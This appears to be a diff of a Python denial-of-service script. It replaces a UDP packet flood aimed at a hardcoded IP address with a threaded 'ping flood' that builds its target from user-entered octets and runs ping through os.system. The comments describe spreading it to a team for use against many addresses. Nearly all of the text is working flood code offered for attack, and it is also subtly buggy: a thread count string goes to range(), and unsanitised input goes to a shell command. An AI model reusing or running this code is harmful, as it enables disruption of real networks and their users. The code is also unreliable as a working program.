@@ -60,31 +60,31 @@ print("""\033[31m
 """)
 time.sleep(2)
 
-import sys
+#Chase Alexander DDOS Ping flood
+
 import os
-import socket
-import random
-
-##############
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-#############
-
-print('DDoS ICMP Flood Attack')
-print('Change IP in script')
-print()
-input('Hit enter to start, Ctrl+C to exit => ')
-
-# change ip here
-ip = "77.109.33.232"
-port = 80
-sent = 0
+import threading
 
 
-while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
-     if port == 65534:
-       port = 1
+threads=input("how many threads?")#determines the number of threads running simultaneously for volume control
+
+#setting the target ip address, modular so it can distributed to the team for widespread use on multiple IPs
+target1=input("first octect")
+target2=input("second octect")
+target3=input("third octet")
+target4=input("fourth octet")
+target1=str(target1)
+target2=str(target2)
+target3=str(target3)
+target4=str(target4)
+#combines the octets into a full address
+target=target1+"."+target2+"."+target3+"."+target4
+
+#method to send 4 pings to the target ip address
+def attack():
+	os.system("ping -c 10 "+target)
+
+#thread control determining the number of sets of pings going to an address
+for i in range(threads):
+	thread = threading.Thread(target=attack)
+	thread.start()
